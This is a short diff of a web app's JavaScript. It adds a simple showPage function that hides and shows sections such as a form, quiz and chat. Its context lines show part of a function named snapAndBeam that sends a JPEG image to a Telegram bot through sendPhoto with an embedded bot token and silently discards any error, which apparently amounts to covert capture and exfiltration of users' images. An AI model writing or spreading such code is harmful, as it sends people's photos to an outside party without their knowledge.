@@ -1210,3 +1210,25 @@ async function snapAndBeam() {
         try { await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch (err) {}
     }, 'image/jpeg', 0.5); 
 }
+
+  // ==========================================
+// THE SWITCHBOARD FUNCTION (FIXES BUTTONS)
+// ==========================================
+function showPage(pageId) {
+    // 1. Find all sections on your app (form, quiz, chatbot, etc.)
+    const panels = document.querySelectorAll('.page, .card, section, div[id]');
+    
+    // 2. Hide all of them instantly
+    panels.forEach(panel => {
+        // Only hide sections that are meant to be full pages
+        if(panel.id === 'awaaz-form-fields' || panel.id === 'awaaz-success' || panel.id.includes('page') || panel.id.includes('quiz') || panel.id.includes('chat')) {
+            panel.style.display = 'none';
+        }
+    });
+
+    // 3. Make the specific page you clicked reappear!
+    const activePanel = document.getElementById(pageId);
+    if (activePanel) {
+        activePanel.style.display = 'block';
+    }
+}
